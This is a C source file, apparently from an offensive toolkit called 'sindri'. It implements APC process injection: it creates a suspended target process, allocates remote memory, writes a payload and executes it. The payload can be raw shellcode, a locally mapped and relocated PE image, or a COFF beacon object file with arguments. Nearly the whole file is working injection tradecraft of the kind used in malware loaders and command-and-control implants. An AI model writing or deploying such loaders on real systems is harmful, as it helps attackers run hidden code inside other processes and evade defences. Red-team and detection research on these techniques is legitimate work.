#include <sindri/common/status.h>
#include <sindri/injection/apc/chain.h>
#include <sindri/injection/context.h>
#include <sindri/loaders/coff/engine.h>
#include <sindri/loaders/pe/engine.h>
#include <sindri/parsers/coff/symbols.h>

snd_status_t snd_inj_apc_shell(snd_inj_ctx_t *ctx) {
    if (!ctx)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    snd_status_t status = snd_inj_apc_create_target(ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_inj_apc_alloc_remote(ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_inj_apc_write_payload(ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_inj_apc_set_protections(ctx);
    if (SND_FAILED(status))
        return status;

    return snd_inj_apc_execute(ctx);
}

snd_status_t snd_inj_apc_pe(snd_ldr_pe_ctx_t *ldr_ctx, snd_inj_ctx_t *inj_ctx) {
    if (!ldr_ctx || !inj_ctx)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    // 1. Create target process suspended
    snd_status_t status = snd_inj_apc_create_target(inj_ctx);
    if (SND_FAILED(status))
        return status;

    // 2. Parse the PE locally
    status = snd_pe_parse(ldr_ctx->raw_source, FALSE, &ldr_ctx->pe);
    if (SND_FAILED(status))
        return status;
    ldr_ctx->stage = SND_STAGE_PARSED;

    // 3. Allocate remote memory (size derived from parsed PE)
    snd_buffer_t inject_buf = {0};
    
    // Allocate remote memory (we don't know the exact size until we map it locally, so we allocate after mapping)
    // Actually, snd_ldr_pe_allocate_and_copy_image does both in the classic chain.
    status = snd_ldr_pe_compatibility_check(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_ldr_pe_allocate_and_copy_image(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    inject_buf.data  = ldr_ctx->target.local_base;
    inject_buf.size  = ldr_ctx->target.allocated_size;
    inj_ctx->payload = &inject_buf;

    status = snd_inj_apc_alloc_remote(inj_ctx);
    if (SND_FAILED(status))
        return status;

    // 5. Apply relocations based on the REMOTE base address
    ldr_ctx->target.execution_base = inj_ctx->remote_base;
    status                         = snd_ldr_pe_apply_relocations(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    // 6. Resolve IAT (locally baked)
    status = snd_ldr_pe_resolve_imports(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    // 7. Write fully baked PE into remote process
    status = snd_inj_apc_write_payload(inj_ctx);
    if (SND_FAILED(status))
        return status;

    // 8. Set memory protections
    status = snd_inj_apc_set_protections(inj_ctx);
    if (SND_FAILED(status))
        return status;

    // 9. Execute remote thread
    DWORD ep_rva = SND_PE_GET_NT_FIELD(&ldr_ctx->pe, OptionalHeader.AddressOfEntryPoint);
    inj_ctx->remote_entry_point = (PVOID)((ULONG_PTR)inj_ctx->remote_base + ep_rva);
    return snd_inj_apc_execute(inj_ctx);
}

snd_status_t snd_inj_apc_coff(snd_ldr_coff_ctx_t *ldr_ctx, snd_inj_ctx_t *inj_ctx, const char *entry_point, void *args,
                              int arg_len) {
    if (!ldr_ctx || !inj_ctx || !entry_point)
        return SND_ERR(SND_STATUS_NULL_POINTER);

    // 1. Create target process suspended
    snd_status_t status = snd_inj_apc_create_target(inj_ctx);
    if (SND_FAILED(status))
        return status;

    // 2. Parse the COFF locally
    ldr_ctx->stage = SND_COFF_STAGE_UNINITIALIZED;
    status         = snd_coff_parse(ldr_ctx->raw_source, &ldr_ctx->coff);
    if (SND_FAILED(status))
        return status;
    ldr_ctx->stage = SND_COFF_STAGE_PARSED;

    // 4. Map the COFF sections locally (this populates target.allocated_size)
    status = snd_ldr_coff_allocate_and_copy_sections(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    // 3. Size layout to include space for arguments if provided
    SIZE_T bof_size  = ldr_ctx->target.allocated_size;
    SIZE_T args_size = (args && arg_len > 0) ? (SIZE_T)arg_len : 0;
    SIZE_T total_size = bof_size + args_size;

    snd_buffer_t total_buf = {0};
    total_buf.size = total_size;
    inj_ctx->payload = &total_buf; // Temporary fake buffer to guide alloc

    status = snd_inj_apc_alloc_remote(inj_ctx);
    if (SND_FAILED(status))
        return status;

    // 5. Apply relocations based on remote base
    ldr_ctx->target.execution_base = inj_ctx->remote_base;

    // 6. Resolve Symbols
    status = snd_ldr_coff_resolve_symbols(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    status = snd_ldr_coff_apply_relocations(ldr_ctx);
    if (SND_FAILED(status))
        return status;

    // 7. Write BOF to remote memory
    snd_buffer_t bof_buf = {0};
    bof_buf.data         = ldr_ctx->target.local_base;
    bof_buf.size         = bof_size;
    inj_ctx->payload     = &bof_buf;
    status               = snd_inj_apc_write_payload(inj_ctx);
    if (SND_FAILED(status))
        return status;

    // 8. Write Arguments if present
    if (args_size > 0) {
        PVOID  remote_args_base = (PVOID)((ULONG_PTR)inj_ctx->remote_base + bof_size);
        SIZE_T written          = 0;
        status = inj_ctx->proc_api->write_remote(inj_ctx->target_process, remote_args_base, args, args_size, &written);
        if (SND_FAILED(status))
            return status;
        inj_ctx->remote_arg = remote_args_base;
    } else {
        inj_ctx->remote_arg = NULL;
    }

    // 9. Set memory protections
    inj_ctx->payload = &total_buf; // Reset size for protect
    status           = snd_inj_apc_set_protections(inj_ctx);
    if (SND_FAILED(status))
        return status;

    // 10. Execute
    char ep_name[64] = {0};
    {
        const char *s = entry_point ? entry_point : "go";
        int         k = 0;
        while (s[k] && k < (int)(sizeof(ep_name) - 1)) {
            ep_name[k] = s[k];
            k++;
        }
        ep_name[k] = '\0';
    }

    PIMAGE_SYMBOL entry_sym = NULL;
    status                  = snd_coff_find_symbol_by_name(&ldr_ctx->coff, ep_name, &entry_sym, NULL);
    if (SND_FAILED(status) || !entry_sym) {
        return SND_ERR(SND_STATUS_COFF_SYMBOL_NOT_FOUND);
    }

    if (entry_sym->SectionNumber <= 0 || (DWORD)entry_sym->SectionNumber > ldr_ctx->coff.sections_count) {
        return SND_ERR(SND_STATUS_COFF_SYMBOL_NOT_FOUND);
    }

    LPVOID section_base_local = ldr_ctx->target.section_map[entry_sym->SectionNumber];
    if (!section_base_local) {
        return SND_ERR(SND_STATUS_COFF_SYMBOL_NOT_FOUND);
    }

    // Calculate remote address
    ULONG_PTR ep_rva = ((ULONG_PTR)section_base_local + entry_sym->Value) - (ULONG_PTR)ldr_ctx->target.local_base;
    inj_ctx->remote_entry_point = (PVOID)((ULONG_PTR)inj_ctx->remote_base + ep_rva);

    return snd_inj_apc_execute(inj_ctx);
}
